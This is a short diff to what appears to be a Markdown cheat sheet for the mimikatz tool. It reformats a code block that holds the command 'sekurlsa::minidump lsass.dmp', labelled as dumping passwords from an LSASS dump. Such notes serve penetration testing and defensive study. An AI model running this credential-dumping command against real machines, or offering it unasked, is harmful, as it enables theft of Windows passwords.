@@ -18,7 +18,9 @@ mimikatz# log /stop
 
 Turning on logging to output to file (Starting and stopping)
 
-```mimikatz# sekurlsa::minidump lsass.dmp```
+```
+mimikatz# sekurlsa::minidump lsass.dmp
+```
 
 Dumping password from lsass dump
 
